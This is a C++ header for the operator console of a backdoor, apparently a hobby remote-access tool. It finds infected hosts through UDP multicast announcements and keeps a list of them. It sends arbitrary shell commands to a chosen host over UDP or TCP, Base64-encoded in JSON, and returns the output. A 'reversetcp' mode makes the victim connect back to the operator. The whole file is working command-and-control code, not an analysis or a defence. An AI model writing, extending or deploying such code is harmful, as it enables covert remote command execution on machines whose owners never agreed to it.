#pragma once
#include <protocol\BDoorProtocol.h>
#include <other\tools.h>
#define RETURNSTR "返回"
#define EXITSTR "退出"
#define EXIT_VALUE 3
class Command {
private:
	const string name;
public:
	virtual int Func(string command,string& returnmess) = 0;
	virtual string GetName() = 0;
};
class SearchHost:public Command{
private:
	const string name = "主机列表";
	list<sockaddr_in> host_list;
	SOCKET group_socket;
public:
	SearchHost() {
		thread([this]() {
			group_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in group_addr;
			group_addr.sin_family = AF_INET;
			group_addr.sin_addr.s_addr = htonl(INADDR_ANY);
			group_addr.sin_port = htons(GROUP_PORT);
			bindport(group_socket, (const sockaddr*)&group_addr, sizeof(group_addr));
			ip_mreq mreq;
			mreq.imr_multiaddr.s_addr = inet_addr(GROUP_IP);
			mreq.imr_interface.s_addr = INADDR_ANY;
			setsockopt(group_socket, IPPROTO_IP, IP_ADD_MEMBERSHIP, (char*)&mreq, sizeof(mreq));
			int Result;
			sockaddr_in sender_addr;
			int sender_addr_size = sizeof(sender_addr);
			while (true) {
				char buf[1024];
				Result = recvfrom(group_socket, buf, sizeof(buf), 0, (sockaddr*)&sender_addr, &sender_addr_size);
				if (Result == SOCKET_ERROR) {
					wprintf(L"recvfrom failed with error %d\n", WSAGetLastError());
				}
				else {
					host_list.push_back(sender_addr);
					host_list.unique();
				}
			}
			}).detach();
	}
	~SearchHost() {
		if (group_socket != INVALID_SOCKET) {
			closesocket(group_socket);
		}
	}
	int Func(string command, string& returnmess) {
		if (command == "查看主机列表"|| command == "host") {
			returnmess += "主机列表：\n\n";
			for (auto e : host_list) {
				returnmess += string(inet_ntoa(e.sin_addr))+"\n";
			}
			return END;
		}
		else if (command == "清空主机列表"|| command == "clear") {
			host_list.clear();
			return END;
		}
		else {
			return NOTCOM;
		}
	}
	list<sockaddr_in>& GetHostList() { return host_list; }
	string GetName() override { return name; }
};
class UDP:public Command{
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &udp_socket;
		sockaddr_in &udp_addr;
		int step = 0;
	public:
		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {

		}
		int Func(string command, string& returnmess) {
			if (step == 0) {
				if (command == name) {
					DebugLog("cmd模式");
					step++;
					return ENTRANCE;
				}else {
					return NOTCOM;
				}
			}
			else if (step == 1) {
				if (command == RETURNSTR) {
					return END;
				}
				string recvmess;
				if (udp::SendtoBase64(udp_socket, udp_addr, FormatJson(name,command).dump()) < 0) {
					returnmess = SENDERROR;
					return ERROR;
				}
				sockaddr_in sender_addr;
				if (udp::RecvfromBase64(udp_socket,sender_addr,recvmess)< 0) {
					returnmess = RECVERROR;
					return ERROR;
				}
				
				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
				return ENTRANCE;
			}
		}
		string GetName() override { return name; }
	};
	const string name = "udp";
	SOCKET udp_socket;
	sockaddr_in udp_addr;
	int step = 0;
	Command* entrance = nullptr;
	Cmd cmd = Cmd(udp_socket,udp_addr);
	
public:
	vector<Command*> command_list = { &cmd };
	UDP() {
		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(UDP_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(udp_socket, (const sockaddr*)&addr, sizeof(addr));
		udp_addr.sin_family = AF_INET;
		udp_addr.sin_port = htons(UDP_PORT);
	}
	~UDP() {
		if (udp_socket != INVALID_SOCKET) {
			closesocket(udp_socket);
		}
	}
	int Func(string command, string& returnmess) override {
		if (step == 0) {
			vector<string> command_split;
			split_string(command, " ", command_split);
			if (command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = IPEMPTY;
					return ERROR;
				}
				if (check_ip(command_split[1])) {
					udp_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
					DebugLog(string("udp模式 连接：") + inet_ntoa(udp_addr.sin_addr));
					step++;
					return ENTRANCE;
				}
				else {
					returnmess = IPERROR;
					return ERROR;
				}
			}
			else {
				return NOTCOM;
			}
		}
		else if (step == 1) {
			if (command == RETURNSTR && entrance == nullptr) {
				step = 0;
				return END;
			}
			bool is_com = false;
			int Result;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != NOTCOM) {
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if (!is_entrance) { entrance = command_list[i]; }
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + string(NOT_ANY_COMMAND);
				return ENTRANCE;
			}
		}
	}

	SOCKET& GetUdpSocket() { return udp_socket; }
	string GetEntranceName() { return entrance->GetName(); }
	string GetName() override { return name; }
};
class TCP: public Command {
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &connect_socket;
		sockaddr_in &connect_addr;
		int step = 0;

	public:
		Cmd(SOCKET &connect_socket_a,sockaddr_in &connect_addr_a):connect_socket(connect_socket_a),connect_addr(connect_addr_a) {

		}
		int Func(string command, string& returnmess) {
			if (step == 0) {
				if (command == name) {
					step++;
					return ENTRANCE;
				}
				else {return NOTCOM;}
			}
			else if (step == 1) {
				if (command == RETURNSTR) {
					step = 0;
					return END;
				}
				int Result;
				Result = tcp::SendBase64(connect_socket, FormatJson(name, command).dump());
				if (Result == -1) {
					returnmess = SENDERROR;
					return ERROR;
				}
				else if (Result == 0) {
					returnmess = DISCONNECT;
					return ERROR;
				}
				string recvmess;
				Result = tcp::RecvBase64(connect_socket, recvmess);
				if (Result == -1) {
					returnmess = RECVERROR;
					return ERROR;
				}
				else if (Result == 0) {
					returnmess = DISCONNECT;
					return ERROR;
				}
				if (recvmess.empty()) {
					returnmess = NODATA;
					return ERROR;
				}
				else {
					returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
					return ENTRANCE;
				}
			}	
		}
		string GetName() override { return name; }
	};
	const string name = "tcp";
	SOCKET listen_socket, connect_socket;
	sockaddr_in connect_addr,listen_addr;
	Command* entrance = nullptr;
	int step = 0;
	Cmd cmd = Cmd(connect_socket,connect_addr);
	vector<Command*> command_list = { &cmd };
	int ListenConnect() {
		listen(listen_socket, 5);
		int connect_addr_len = sizeof(connect_addr);
		connect_socket = accept(listen_socket, (sockaddr*)&connect_addr,&connect_addr_len);
		return 1;
	}
public:
	TCP() {
		listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&listen_addr, 0, sizeof(listen_addr));
		listen_addr.sin_family = AF_INET;
		listen_addr.sin_port = htons(TCP_PORT);
		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(listen_socket, (const sockaddr*)&listen_addr, sizeof(listen_addr));
		connect_addr = CreateSockAddrIn(TCP_PORT);
	}
	~TCP() {
		if (connect_socket != INVALID_SOCKET) {
			closesocket(connect_socket);
		}
		if (connect_socket != INVALID_SOCKET) {
			closesocket(connect_socket);
		}
	}
	int Func(string command,string &returnmess) override {
		if (step == 0) {
			vector <string>command_split;
			split_string(command, " ", command_split);
			if (command_split[0] == "reversetcp" || command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = IPEMPTY;
					return ERROR;
				}
				if (check_ip(command_split[1])) {
					connect_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
					if (command_split[0] == "reversetcp") {
						step = 10;
					}
					else if (command_split[0] == name) {
						step++;
					}
					return ENTRANCE;
				}
				else {
					returnmess = IPERROR;
					return ERROR;
				}
			}
			else {
				return NOTCOM;
			}
		}
		else if (step == 1) {
			if (command == RETURNSTR) {
				step = 0;
				return END;
			}
			bool is_com = false;
			int Result;
			connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != NOTCOM) {
					int Result2 = shutdown(connect_socket, SD_BOTH);
					if (Result2 == SOCKET_ERROR) {
						wprintf(L"shutdown failed with error: %d\n", WSAGetLastError());
						returnmess = SHUTDOWN_ERROR;
						return ERROR;
					}
					if (connect_socket != INVALID_SOCKET) {
						Result2 = closesocket(connect_socket);
						if (Result2 == SOCKET_ERROR) {
							wprintf(L"closesocket failed with error: %d\n", WSAGetLastError());
							returnmess = COLSESOCKET_ERROR;
						}
					}
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if(!is_entrance){entrance = command_list[i];}
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
				return NOTCOM;
			}
		}	

		if (step == 10) {
			if (command == RETURNSTR) {
				step = 0;
				return END;
			}
			SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in addr = CreateSockAddrIn(REVERSE_PORT);
			bindport(reverse_socket, (const sockaddr*)&addr, sizeof(addr));
			sockaddr_in target_addr = CreateSockAddrIn(inet_ntoa(connect_addr.sin_addr), REVERSE_PORT);
			udp::SendtoBase64(reverse_socket, target_addr, FormatJson(name, REVERSECONNECT));
			ListenConnect();
			bool is_com = false;
			int Result;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result != 0) {
					is_com = true;
				}
				switch (Result)
				{
				case END:
					entrance = nullptr;
					return ENTRANCE;
				case ENTRANCE:
					if (!is_entrance) { entrance = command_list[i]; }
					return ENTRANCE;
				case ERROR:
					entrance = nullptr;
					return ENTRANCE;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
				return NOTCOM;
			}
		}
	}
	string GetEntranceName() { return entrance->GetName(); }
	string GetName() override { return name; }
};
class BDoorControl {
private:
	int wsa = WSAInit();
	SearchHost search_host = SearchHost();
	UDP udp = UDP();
	TCP tcp = TCP();
	vector<Command*> command_list = {&search_host,&udp,&tcp};
	Command *entrance = nullptr;
public:
	
	int EnterCommand(string command, string& returnmess) {
		
		if (command.empty()) {
			returnmess = "";
			return 0;
		}
		if (command == EXITSTR) { return EXIT_VALUE; }
		bool is_com = false;
		int Result;
		for (int i = 0; i < command_list.size(); i++) {
			bool is_entrance = false;
			if (entrance != nullptr) {
				Result = entrance->Func(command, returnmess);
				is_entrance = true;
			}
			else {
				Result = command_list[i]->Func(command, returnmess);
			}
			if (Result != 0) {
				is_com = true;
			}
			switch (Result)
			{
			case END:
				entrance = nullptr;
				return 1;
			case ENTRANCE:
				if (!is_entrance) {entrance = command_list[i];}
				return 1;
			case ERROR:
				entrance = nullptr;
				return -1;
			default:
				break;
			}
			if(is_entrance){break;}
		}
		if (!is_com) {
			returnmess = "'" + command + "'" + NOT_ANY_COMMAND;
			return 0;
		}
	}
	string GetEntranceName() { return entrance->GetName(); }
	~BDoorControl() {
		WSACleanup();
	}
};